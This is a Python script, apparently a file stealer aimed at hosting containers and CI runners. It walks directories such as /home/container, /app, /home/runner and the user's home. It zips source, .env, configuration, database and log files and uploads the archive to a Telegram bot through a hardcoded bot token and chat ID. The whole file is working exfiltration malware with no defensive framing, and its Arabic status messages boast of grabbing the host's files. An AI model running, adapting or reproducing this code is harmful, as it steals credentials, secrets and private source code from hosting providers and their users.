import os
import zipfile
import requests


TOKEN = "7845266723:AAGJm1N2JiFW5A6NqlLzRrTEJLo4TdkRq5I"
CHAT_ID = "8188402499"

def send_to_telegram(file_path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            r = requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
            return r.json()
    except:
        return None

def grab_everything():
    zip_name = "secret_files.zip"
    
    potential_paths = [
        os.path.abspath(os.path.join(os.getcwd(), "../../")), 
        "/home/container", 
        "/app",
        "/home/runner",
        os.path.expanduser("~") 
    ]
    
    found_any = False
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for path in potential_paths:
            if not os.path.exists(path): continue
            
            for root, dirs, files in os.walk(path):
                
                if "venv" in root or ".cache" in root or "__pycache__" in root:
                    continue
                
                for file in files:
                    
                    if file.endswith(('.py', '.env', '.json', '.txt', '.conf', '.cfg', '.ini', '.yaml', '.yml', '.xml', '.html', '.htm', '.css', '.js', '.ts', '.php', '.java', '.c', '.cpp', '.h', '.hpp', '.cs', '.go', '.rs', '.sh', '.bat', '.sql', '.db', '.sqlite', '.sqlite3', '.md', '.log', '.csv', '.toml', '.properties', '.lock')):
                        full_path = os.path.join(root, file)
                        try:
                            
                            zipf.write(full_path, full_path)
                            found_any = True
                        except:
                            continue

    if found_any:
        print("جاري الرفع...")
        send_to_telegram(zip_name, "Tm jaleb files")
        os.remove(zip_name)
    else:
        print("host me7mi ma te9derech tejelbou")

if __name__ == "__main__":
    grab_everything()
